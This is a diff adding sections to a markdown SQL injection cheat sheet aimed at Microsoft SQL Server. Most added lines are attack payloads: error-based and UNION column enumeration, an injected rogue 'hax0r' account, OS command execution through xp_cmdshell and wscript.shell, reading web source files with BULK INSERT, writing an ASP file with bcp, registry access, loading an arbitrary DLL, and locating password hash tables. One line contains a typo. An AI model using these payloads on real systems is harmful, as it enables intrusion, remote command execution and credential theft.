@@ -123,6 +123,134 @@ select load_file(0x633A5C626F6F742E696369) -- (M)
 
 ```
 
+### Error Base - Find columns Names
+```sql
+-- Finding Columns Names with HAVING BY - Error Base(S)
+# ' HAVING 1=1 --
+# ' GROUP BY table.columnfromerror1 having 1=1 --
+# ' Group by table.columnfromerror1,columnfromerror2 having 1=1 --
+# ' Group by table.columnfromerror1,columnfromerror2,columnfromerror(n) having 1=1 --
+# And so on.
+# If you are not getting any more error the it's done.
+
+-- Finding how many columns in SELECT query by ORDER BY(MOS+)
+# order by 1--
+# order by 2--
+# order by n--
+# Keep going until get an error. Error means you found the number of selectd columns
+```
+
+### Data Types,UNION, etc.
+```sql
+-- Hints:
+# Always use UNION whit ALL because of image similar non-distinct field types.By default union tries to get records whit distinct
+# To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time
+# Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc
+#   Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)
+
+-- Finding Column Type
+# ' union select sum(columntofind) from users --(S)
+/*
+ * Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+ * [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument. 
+ * If you are not getting an error it means column is numeric
+ */
+# Also you can use CAST() or CONVERT()
+/*
+ * select * from table1 where id = -1 union all select null,null,null,null,convert(image,1),null--
+ */
+# 11223344) union select null,null,null,null where 1=2-- No Error - Syntax is right. MS SQL SERVER used. Procceeding
+# 11223344) union select 1,null,null where 1=2-- No Error - First column is an integer
+# 11223344) union select 1,2,null,null where 1=2-- Error - Second column is not an integer
+# 11223344) union select 1,'2',null,null where 1=2-- No Error - second column is a string.
+# 11223344) union select 1,'2',3,null where 1=2-- Error - Third column is not an integer
+/*
+Microsoft OLE DB Provider for SQL Server error '80040e07' 
+Explicit conversion from data type int to image is not allowed.
+*/
+```
+
+### Simple Insert(MSO+)
+```sql
+';insert into users values(1,'hax0r', 'coolpass',9) /*
+```
+
+### Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes
+```sql
+-- @@version(MS)
+insert into member(id,user,pass) values(1,''+substring(@@version,1,10), 10)
+
+-- Bulk Insert(S)
+/*Insert a file content to a table. If you don't know internal path of web application you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path.
+
+    Create table foo( line varchar(8000) )
+    bulk insert foo from 'c:\inetpub\wwwroot\login.asp'
+    Drop temp table, and repeat for another file.
+*/
+
+-- BCP(s)
+# Write text file.Login Credentials are required to use this function
+bcp "select * from test..foo" queryout "c:\runcommand.asp" -c -Slocalhost -Usa -Pfoobar
+
+-- VBS,WSH in SQL Server(S)
+# You can use VBS,WSH scripting in SQL Server because of ActiveX support.
+declare @o int 
+exec sp_oacreate 'wscript.shell', @o out 
+exec sp_oamethod @o, 'run', NULL, 'notepad.exe' 
+Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- 
+
+-- Executing system commands.xp_cmdshell(S)
+# Well known trick, By default it's disabled in SQL Server 2005. You need to have admin access
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
+# You can not read results directly from error or union or something else.
+
+-- Some Special Tables in SQL Server(S)
+# Error Messages
+master..systemessages
+# Linked Servers
+master..sysservers
+# Password(2000 and 2005 both can be crackable, they use very similar hashing algorighm)
+SQL Server 2000: master..sysxlogins
+SQL Server 2005: sys.sql_logins
+
+-- More Stored Procedures for SQL Server(S)
+# Cmd Execute(xp_cmdshell)
+exec master.dbo.xp_cmdshell 'dir'
+# Registry Stuff(xp_regread)
+xp_regaddnultistring
+xp_regdeletekey
+xp_regdeletevalue
+xp_regenumkeys
+xp_regenumvalues
+xp_regread
+xp_regremovemultistring
+xp_regwrite
+  exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' 
+exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
+# Managing Services(xp_servicecontrol)
+# Medias(xp_availablemedia)
+# ODBC Resources(xp_enumdsn)
+# Login mode(xp_loginconfig)
+# Creating Cab Files(xp_makecab)
+# Domain Enumeration(xp_ntsec_enumdomains)
+# Process Killing(Need PID)(xp_terminate_process)
+# Add new procedure(virtually you can execute whatever you want)
+#    sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'
+#    exec xp_webserver
+# Write text file to UNC or an internal path(sp_makewebtask)
+
+-- MSSQL Bulk Notes
+select * from master..sysprocesses /*where spid=@@spid*/
+declare @result int; exec @result = xp_cmdshell 'dir *.exe'; if(@result = 0) select 0 else sleect 1/0
+
+HOST_NAME()
+IS_MEMBER(Transact-SQL)
+IS_SRVROLEMEMBER(Transact-SQL)
+OPENDATASOURCE(Transact-SQL)
+insert tbl exec master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"
+
+```
+
 ## 注入方法
 1) 联合查询注入
 2) 报错注入
